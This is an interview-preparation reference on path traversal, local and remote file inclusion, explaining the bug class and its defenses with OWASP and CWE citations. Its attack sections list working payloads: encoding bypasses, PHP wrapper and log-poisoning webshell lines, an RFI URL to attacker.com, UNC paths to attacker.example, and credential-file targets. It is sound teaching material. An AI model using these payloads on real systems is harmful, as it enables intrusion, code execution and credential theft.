# Path Traversal and File Inclusion (LFI / RFI)

> The application takes attacker-influenced input and uses it to build a filesystem path (or an include target) without first canonicalizing that path and confining it to an intended directory. Because `../` means "go up one level" to the operating system, an unconfined path escapes the base directory and names arbitrary files. The three severities are one spectrum: path traversal reads (or writes) a file, Local File Inclusion (LFI) additionally executes the included file's contents in the app runtime, and Remote File Inclusion (RFI) executes a file fetched from a URL the attacker controls. Root cause is always the same: trusting input to name a path, and failing to canonicalize then confine before the filesystem call. This is CWE-22.

**Interview frequency:** Common

## How it works

A vulnerable handler concatenates a base directory with a request value and hands the result to a filesystem API:

```
/* base */            /var/www/images/
/* user input */      218.png
/* read */            /var/www/images/218.png
```

Supplying traversal sequences walks the result out of the base before the read happens:

```
GET /loadImage?filename=../../../etc/passwd
=> reads /var/www/images/../../../etc/passwd
=> which the OS resolves to /etc/passwd
```

Why it works: `../` is a legal path component that the kernel collapses during path resolution, so three of them climb from `/var/www/images/` to the filesystem root. The application never intended to leave `images/`; it just trusted the filename. On Windows both `../` and `..\` are valid separators, so the equivalent is `..\..\..\windows\win.ini`. Note a platform difference: on Linux an attacker can traverse the whole disk, while on Windows they are confined to the partition holding the web root.

Three distinct sinks, escalating in impact:

- Read/write sink: the path feeds `open`/`read`/`sendfile`/`File(...)`/`readFile`/a download handler. Impact: disclose secrets and source, or (if the path feeds a write) overwrite files.
- Include/execute sink (LFI): the path feeds a language `include`/`require`/`import`, so the file's bytes are executed in the runtime. Predominantly PHP, but any dynamic-include mechanism qualifies. Reading is only the first step; the goal is code execution.
- Remote include sink (RFI): the include target may be a URL, so the server fetches and executes attacker-hosted code. Instant RCE where present.

One parsing subtlety that enables encoding bypasses: web containers perform one layer of percent-decoding on values from the URL and forms before the application sees them. If the application then decodes again, or if the container decodes a sequence the application's filter did not expect, encoded traversal slips through the gap between the check and the filesystem call.

## Quick reference

```
GET /loadImage?filename=../../../etc/passwd
# Each ../ climbs one directory; three of them walk the read from
# /var/www/images/ up to the filesystem root, so the handler opens
# /etc/passwd instead of the image it was meant to serve.
```

| Invariant | Where enforced | How violated | Source |
|---|---|---|---|
| No user-controlled string reaches a filesystem/include call directly; an indirect identifier maps to a server-known path | Route handler / path-resolution layer | Basic traversal (`?filename=../../../etc/passwd`) or an absolute path (`?filename=/etc/passwd`) flows straight into `open`/`include` | <sup>[[1]](#ref1)</sup> |
| The resolved, canonical (symlink-resolved) path still lives under the authorized base directory | Canonicalize-then-confine check, run before the filesystem call | A naive prefix check on a lexically-normalized (not canonical) path, or one missing a trailing separator, lets `../` or a sibling-directory string slip through | <sup>[[2]](#ref2)</sup> |
| Path validation runs against the fully decoded, canonical string, never a single-pass-decoded or blacklist-stripped one | Input-validation / allowlist layer, applied after all decode passes | Double URL-encoding, overlong UTF-8, and non-recursive stripping (`....//`) reconstitute `../` after the filter already ran | <sup>[[1]](#ref1)</sup> |
| Remote and dynamic inclusion features are disabled; the include target is never a URL or attacker-suppliable content | Interpreter config (`allow_url_include=Off`, `allow_url_fopen=Off`) plus no dynamic `include` on user input | RFI fetches and executes attacker-hosted code; `php://input`/`data://` make the "included file" attacker-controlled bytes | <sup>[[1]](#ref1)</sup> |
| Canonicalization and the open/include syscall happen atomically with respect to the confinement check | Atomic resolve-and-open primitive (`openat2` with `RESOLVE_BENEATH`) | `realpath()` followed by a separate reopen-by-string leaves a TOCTOU window for an attacker to swap a path component for a symlink | <sup>[[2]](#ref2)</sup> |
| Archive-extraction entry paths are canonicalized and confined to the destination directory before any file is written | Archive-extraction routine (Zip Slip fix) | A malicious zip/tar entry name (`../../../../etc/cron.d/pwn`) escapes `destDir` when the extractor writes without canonicalizing first | <sup>[[2]](#ref2)</sup> |

## Attack techniques

### 1. Basic traversal (read arbitrary files)

```
https://target/loadImage?filename=../../../etc/passwd          (Linux)
https://target/loadImage?filename=..\..\..\windows\win.ini     (Windows)
```

Why it works: no confinement, so `../` escapes the base. Confirmation: the response contains the file (`root:x:0:0:...` for `/etc/passwd`). Test systematically against every parameter that could name a file.

### 2. Absolute path

```
?filename=/etc/passwd
?f=/var/www/html/get.php        (read the app's own source)
```

Why it works: if traversal sequences are blocked but the base directory is not actually enforced (the input is used as-is), an absolute path ignores the base entirely. Confirmation: file returned without any `../`.

### 3. Filter bypasses (the reasoning)

Filters that strip or block `../` fail because of decoding gaps and non-recursive replacement.

- URL-encoding and double URL-encoding (the container decodes one layer; a second layer survives to a re-decoding sink):

```
%2e%2e%2f        -> ../
%2e%2e/          -> ../
..%2f            -> ../
%252e%252e%252f  -> ../   (double-encoded)
..%255c          -> ..\   (double-encoded, Windows)
```

- Overlong / non-standard UTF-8 (legacy decoders map these to `.` and `/`):

```
..%c0%af         -> ../
..%c1%9c         -> ..\
..%ef%bc%8f      -> ../   (fullwidth solidus)
```

- Backslash on Windows: `..\`, `..%5c`, mixed `..%2f`.
- Non-recursive stripping: if the filter removes `../` exactly once, feed a sequence that reconstitutes it after one pass:

```
....//           -> (strip inner ../) -> ../
....\/           -> ..\
..././           -> ../
```

- Forced base-directory prefix: if the app requires the path to start with the allowed folder, include it and then climb out:

```
?filename=/var/www/images/../../../etc/passwd
```

- Forced extension suffix: if the app appends `.png`, historically a null byte truncated the string before the extension (`filename=../../../etc/passwd%00.png`). The OS saw `.passwd`, the language runtime saw `.png`. This was fixed in modern PHP (5.3.4+) and most runtimes; on current stacks pivot to a stream wrapper, path truncation, or target a file that already ends in the forced extension.
- Forced starts-with folder as a substring check: `expected/../../etc/passwd` satisfies a naive "must contain `expected/`" check while still traversing.

Why these work: each exploits a mismatch between the layer that validates (string filter, one decode) and the layer that resolves (kernel path resolution after full decode). The senior framing: never filter, canonicalize then confine.

### 4. LFI to RCE (the classic escalations)

Reading files is medium impact; interviewers want the path to code execution. These are PHP-centric because PHP `include`/`require` execute whatever they read.

Vulnerable pattern (from the OWASP write-up, via Wikipedia)<sup>[[1]](#ref1)</sup>:

```php
<?php
$template = 'blue.php';
if (isset($_COOKIE['TEMPLATE'])) $template = $_COOKIE['TEMPLATE'];
include("/home/users/phpguru/templates/" . $template);
?>
```

- PHP stream wrappers:

```
php://filter/convert.base64-encode/resource=index.php   read+exfil source (base64), read-only but leaks secrets
php://input                                             include the raw POST body as PHP code (needs allow_url_include for some builds)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+   inline payload
expect://id                                             run a command (needs the expect extension)
zip://uploaded.zip%23shell.php                          execute code from an uploaded archive
phar://uploaded.phar/shell.php                          execute from a Phar; phar:// also triggers deserialization (its own RCE path)
```

Why `php://filter` works: it is a read-only wrapper, so it bypasses "the file must be executable" logic and returns the source base64-encoded, letting you exfiltrate config/source (DB creds, `SECRET_KEY`) from a mere read primitive. Why `php://input`/`data://` work: they make the "file" you include be content you supply, so the included bytes are attacker PHP that executes.

- Log poisoning: write PHP into a log the server records, then LFI-include that log so your code executes.

```
User-Agent: <?php system($_GET['c']); ?>
=> then include /var/log/apache2/access.log (or nginx, SSH auth.log, mail log)
```

- Session poisoning: get PHP stored into your own session file via a controllable session value, then include it.

```
=> include /var/lib/php/sessions/sess_<PHPSESSID>  or  /tmp/sess_<id>
```

- /proc tricks: include `/proc/self/environ` after poisoning an environment value (for example User-Agent, on older setups that expose it), or `/proc/self/fd/*`.
- Upload plus include: upload a benign-looking file (an "image" that contains PHP), then LFI-include it. This defeats upload filters that only check the extension/content type, because the include, not the upload, is the execution sink.

Confirmation for all: your command output (or a time delay / OOB callback) appears, proving execution rather than mere read.

### 5. RFI (remote file inclusion)

```
http://target/some-page?page=http://attacker.com/shell.txt
```

Why it works: with PHP `allow_url_include=On`, `include($_GET['page'])` fetches and executes remote code, so you host the payload and get direct RCE. Rare on modern PHP (`allow_url_include` is Off by default), but an instant win where present. The same setting gates remote stream wrappers.

### 6. High-value read targets (quick recall)

`/etc/passwd`, `/etc/shadow` (if readable), app config and `.env` (DB creds, API keys), application source, `~/.ssh/id_rsa`, `~/.aws/credentials`, `/proc/self/cmdline` and `/proc/self/environ`, web server config (`httpd.conf`, nginx `sites-enabled`), framework secrets (`settings.py`, `web.config`, `application.properties`), and on Windows `win.ini`, `\windows\system32\drivers\etc\hosts`, `unattend.xml`, SAM/registry hives.

### 7. Zip Slip (archive-extraction traversal)

The same traversal bug moves from URL parameters to the entries inside a user-supplied archive. A malicious zip, tar, jar, or war contains entries whose stored names are traversal payloads such as `../../../../etc/cron.d/pwn` or `..\..\Windows\Temp\shell.exe`. A naive extractor iterates entries and writes each one with something like `new File(destDir, entry.getName())` or the Python equivalent `open(os.path.join(dest, name), 'wb')`, then discovers, when it hands that path to the OS, that the entry name escaped the destination directory. The write lands wherever the entry points: cron directories, systemd unit paths, `.ssh/authorized_keys`, or a location the app itself will later load and execute.

Root cause is CWE-22<sup>[[2]](#ref2)</sup> applied to the entry name rather than a request parameter. Because the sink is a write, not a read, impact escalates directly to code execution on any target where the attacker can pick the destination. The Snyk disclosure in 2018 catalogued this exact bug across Spring, Apache Ant, JBoss, Plexus, and dozens of other libraries whose zip and tar utilities did not canonicalize each entry before opening the output stream; several language ecosystems shipped Zip Slip fixes to their standard libraries in response.

Defense is canonicalize-then-confine applied to each resolved entry path before the extractor calls `open`: resolve `destDir` and the target to their real absolute forms, verify the target starts with `destDir + separator`, and only then create the output file. Reject entries whose names are absolute paths (`/etc/...`, `C:\...`), whose names contain `..` components after normalization, and reject symlink entries entirely unless the extractor has specifically thought about how those interact with the confinement check. This is the same invariant as the URL case; the surface just shifted to entry metadata.

### 8. PHP filter chains (read primitive to RCE)

The interview trap on `php://filter` is that it is read-only, so it "only" leaks source. Synacktiv's 2022 filter-chain technique upgrades that read primitive into full code execution without needing any writable log, session, or upload. PHP allows a stream to have multiple conversion filters applied in sequence (`convert.iconv.*` for encoding conversions, `convert.base64-encode`/`convert.base64-decode`, `zlib.deflate`/`zlib.inflate`), and each conversion is deterministic. By selecting a sequence of iconv conversions whose byte-mangling produces predictable substitutions, an attacker builds a chain that transforms any readable file's contents (for example `/etc/passwd`) into arbitrary attacker-chosen PHP bytes.

Fed to `include($_GET['x'])`, that URL now streams synthesized PHP source into the include, and PHP executes it. There is no need for `allow_url_include`, no need for a writable file, no need for log poisoning. A single `include` sink whose parameter is user-controlled, on modern PHP, is still RCE by way of `php://filter/convert.iconv.<...>/resource=/etc/passwd`. Public tools generate the chain for a chosen payload.

The defense is unchanged and is the reason the fix is stated at the primitive level: do not include user input, disable `allow_url_include`, and if a scheme allowlist gates the include target then drop `php://` from it. This technique is why "the wrapper is read-only" is not a mitigation; the interesting property of the sink is that it interprets bytes as code, and a read primitive that lets the attacker choose the bytes is equivalent to a write primitive.

### 9. Windows-specific filesystem quirks

Windows adds several bypasses beyond `..\` that come up whenever the target is IIS or .NET. 8.3 short filenames survive on NTFS by default: `C:\PROGRA~1\` resolves to `C:\Program Files\`, and `WEB~1.CON` can resolve to `web.config`, so filters that blocklist known long names miss the short-name alias. NTFS alternate data streams provide another bypass: appending `::$DATA` to a script path (`index.php::$DATA`, `Default.aspx::$DATA`) returns the raw source of the file instead of executing it, useful on a read sink that would otherwise hand off to the script engine. Trailing dots and spaces are silently stripped by the Win32 layer, so `web.config.` and `web.config ` open the same file as `web.config`, defeating exact-string extension checks while the underlying open resolves normally.

UNC paths are the highest-impact quirk. On Windows, most file APIs accept `\\server\share\file` and will use the SMB client to reach it, so an attacker-supplied `\\attacker.example\share\anything` in a file sink causes the server process to authenticate outbound to attacker-controlled SMB. The captured Net-NTLMv2 challenge/response is offline-crackable or relayable, and the same trick works over WebDAV (`\\attacker.example@SSL@443\share\file`) when raw SMB is blocked. A serious answer here pairs application-layer rejection of UNC-shaped inputs with network-layer blocking of outbound SMB and WebDAV egress from application servers, because either alone can be bypassed.

Confinement also differs on Windows: traversal reaches only the partition holding the web root, so hosting the site on a non-system drive limits blast radius even when the traversal itself succeeds, which is the platform-level reason Microsoft's guidance for IIS is to keep site content off `C:\`.

### 10. Second-order path traversal

The traversal payload does not have to reach the filesystem sink on the request that supplied it. In second-order path traversal the input is validated (or looks harmless) at the write path and stored somewhere durable: a user profile's avatar filename, a saved report template name, a job record's output path, a tenant's export directory setting. A later request, sometimes by a different user or a background worker, reads that stored string and hands it to `open`/`include`/`sendfile` without re-checking, because the code that runs at the sink treats database-resident strings as trusted internal data.

The mismatch is that filtering at the write path only sees the string once and often applies weaker rules for "just a name we're storing", while the sink sees a value whose provenance has been laundered by a database round-trip. The read-side code frequently omits validation entirely on the theory that "we set this ourselves". Impact matches whichever sink the stored string eventually reaches: read primitive, include primitive, or write primitive.

The fix is to apply canonicalize-then-confine at every sink regardless of the string's source, and to stop treating "came from our own DB" as evidence of safety. Where the sink and the write are far apart in the code, it helps to store an opaque identifier (report ID, template ID) rather than a filename at all, and resolve the identifier to a server-controlled path at read time. This is the same lesson as stored XSS versus reflected XSS: persistence turns validation into an escrow problem, and the escrow does not vouch for anything.

### 11. Detection and blind confirmation

Find file operations whose path derives from request data: `open`/`read`/`include`/`require`/`fopen`/`sendfile`/`File(...)`/`readFile`/template loaders/zip extractors. Probe with encoded traversal, absolute paths, and wrapper schemes. Determine whether the target is a read sink (output returned) or an include sink (content executed) by including something that would error if executed vs merely printed. Blind cases: use timing (include a large/blocking pseudo-file) or verbose error messages, which OWASP notes<sup>[[3]](#ref3)</sup> make it much easier to guess correct paths by leaking the base directory in stack traces.

## Defense

### Real fix

1. Do not pass user input to filesystem APIs at all. Reference files by an indirect identifier: map an opaque ID or an enum value to a known server-side path (`id=5 => "reports/czech.pdf"`), never accept a filename or path from the request. This eliminates the class of bug. OWASP's phrasing<sup>[[1]](#ref1)</sup>: use indexes rather than actual portions of file names.
2. Canonicalize, then confine. Resolve the path to its absolute real form, then verify it still lives under the intended base directory after resolution (this defeats `../` and symlink escapes). Normalize first, check second.

```java
File file = new File(BASE_DIRECTORY, userInput);
if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
    // safe to process
}
```

```python
import os
base = os.path.realpath(BASE_DIR)
target = os.path.realpath(os.path.join(base, user_input))
if target == base or target.startswith(base + os.sep):
    ...   # confined
```

3. Strict allowlist for the varying part: permit only known filenames, or validate against `^[A-Za-z0-9_-]+$` and reject path separators, dots, and any encoded forms. OWASP<sup>[[1]](#ref1)</sup>: accept known-good, do not try to sanitize (blacklisting/stripping is bypassable).
4. Disable dangerous inclusion features: PHP `allow_url_include=Off` and `allow_url_fopen=Off` (kills RFI and remote wrappers), and avoid dynamic `include` on user input entirely. Ensure you understand how the OS will interpret the filename you hand it.
5. Close the TOCTOU race between canonicalize and open. The invariant is that resolution and open happen atomically with respect to the confinement check, because `canonicalize -> check prefix -> open` is a race: between the check and the syscall, an attacker with any write primitive inside the base directory (uploads, temp files, a shared extraction dir) can swap a component for a symlink pointing outside, so the check passes on the old inode and the open follows the new symlink. On Linux the correct primitive is `openat2()` with `RESOLVE_BENEATH` (or `RESOLVE_IN_ROOT`), which asks the kernel to refuse any resolution that escapes the base directory, including through symlinks, bind mounts, and magic links, as part of the open itself. Where `openat2` is unavailable, use `openat` with `O_NOFOLLOW` on each path component, or resolve into a `chroot`/mount namespace so escapes are structurally impossible. The common wrong implementation is to canonicalize with `realpath()` and then reopen by the same string, which is exactly the TOCTOU window the attacker needs.

### Defense in depth

1. Least privilege and isolation: run the app as a low-privilege user, use a chroot jail / container / mount namespace so even a successful traversal reaches little, and keep secrets and configuration outside the web root. On Windows IIS, keep the web root off the system disk to prevent recursive traversal into system directories.
2. Harden logging and session paths so poisoning-to-LFI is infeasible: separate the include surface from writable, attacker-influenced files.

## Interviewer probes

**The filter strips `../` from the filename parameter before using it. Is that sufficient?**

Mid: No, you also need to block absolute paths and make sure the base directory is actually enforced, not just relative traversal sequences.

Principal: No, stripping is a string operation applied to a resolution problem. Non-recursive stripping is defeated by `....//`, which becomes `../` once the inner sequence is removed; single versus double URL-encoding (`%2e%2e%2f` vs `%252e%252e%252f`) and overlong UTF-8 sequences like `%c0%af` bypass filters written against the literal string; and an absolute path bypasses it entirely if the base directory isn't actually enforced. The fix isn't a better filter, it's canonicalizing to the real absolute path and confining after resolution, not before.

**You've implemented `file.getCanonicalPath().startsWith(BASE_DIRECTORY)` as the confinement check in Java. Good enough?**

Mid: Roughly, yes. Canonicalizing the path and checking it starts with the base directory is the right general approach.

Principal: There's a real pitfall in that exact pattern. If `BASE_DIRECTORY` doesn't end in a separator, a sibling directory that shares the same string prefix, `/var/www/images` versus `/var/www/images_public`, can pass the `startsWith` check without actually being inside the intended directory. You have to append the separator before comparing, or compare canonical parent directories directly. And it has to be the canonical (real, symlink-resolved) path being checked, not just a lexically normalized one, or a symlink inside the base directory defeats the whole check.

**The Node.js code uses `path.join(base, userInput)` before opening the file. Does that confine the path?**

Mid: No. `path.join` just concatenates and normalizes the path, it doesn't check that the result stays inside `base`.

Principal: No, and that's a very common misreading. `path.join` normalizes a path, it does not confine it to `base`. If `userInput` is itself absolute, the join semantics can discard `base` entirely on some platforms, and even for a relative traversal like `../../../etc/passwd`, `path.join` will happily normalize it to a clean path that's still outside `base`. The correct pattern is `path.resolve(base, userInput)` followed by an explicit check that the result starts with `base + path.sep`. Most real Node LFIs trace back to `path.join` being treated as a sanitizer when it's just normalization.

**Why does something like `%252e%252e%252f` bypass a filter that already blocks `%2e%2e%2f`?**

Mid: Because it's double URL-encoded, so it needs to be decoded twice before it turns into `../`, and the filter probably only decodes once.

Principal: Because of where decoding happens relative to where the filter runs. The web container performs one layer of percent-decoding on the URL before the application ever sees the value. A filter written against that once-decoded string catches `%2e%2e%2f` because it decodes to `../` on that first pass, but `%252e%252e%252f` only decodes to `../` after a second decode, which happens later at whatever layer re-decodes the string, often the filesystem call itself. The filter and the resolution layer are looking at different numbers of decode passes, and that gap is the bug.

**I've seen null-byte truncation, `filename=../../../etc/passwd%00.jpg`, cited as a way to defeat a forced file extension. Is that still a real technique?**

Mid: It used to work by truncating the string at the null byte so the appended extension never got checked, but I believe modern runtimes patched that.

Principal: It's historical, not current. It worked because C strings terminate at a NUL byte while the higher-level language kept the full string including the appended extension, so the OS open call saw a path ending at `/etc/passwd` while the application's own logic still thought the filename ended in `.jpg`. That was fixed in PHP 5.3.4 and doesn't work on modern runtimes. Citing it as a live technique today is a tell that the knowledge is outdated; the live equivalents are stream wrappers and other extension-suffix tricks, not null-byte truncation.

**You've confirmed you can read `/etc/passwd` through the traversal. What's the actual severity here?**

Mid: It's an arbitrary file read, so at minimum it's high-severity information disclosure: config files, source code, and credentials are all reachable.

Principal: Reading one file is the floor, not the ceiling, and the escalation path is what a staff-level answer states explicitly. In PHP specifically, traversal into an `include`/`require` sink executes whatever's read, so the same bug reaches RCE through log poisoning (writing PHP into a request header the server logs, then including the log), session-file poisoning, or PHP stream wrappers like `php://input` and `data://` that make the "included file" attacker-supplied content outright. Stopping the writeup at "can read `/etc/passwd`" understates the bug if there's any include sink reachable.

**The read primitive here only reaches `php://filter`, which is documented as read-only. Does that cap the impact at information disclosure?**

Mid: Yes, since `php://filter` only reads and transforms file contents, it can't write or execute anything, so the ceiling should be source and secrets disclosure.

Principal: Not necessarily. `php://filter` alone already exfiltrates source code and secrets, which is serious, but the filter-chain technique goes further: by chaining a sequence of `convert.iconv.*` conversions, the read primitive can be made to synthesize arbitrary attacker-chosen PHP bytes from any readable file's contents. Fed into an `include` sink, that's full RCE from a wrapper that's read-only by design, no writable log or session file required. "It can only read files" is exactly the assumption that technique breaks.

## Sources

<a id="ref1"></a>[1] OWASP Community, "Path Traversal" (encoding variations, null byte, absolute path, RFI, prevention). OWASP. Retrieved 2026. https://owasp.org/www-community/attacks/Path_Traversal

<a id="ref2"></a>[2] MITRE, "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')". MITRE CWE. Retrieved 2026. https://cwe.mitre.org/data/definitions/22.html

<a id="ref3"></a>[3] OWASP, "WSTG - Testing for Directory Traversal / File Include". OWASP Web Security Testing Guide. Retrieved 2026. https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include.md
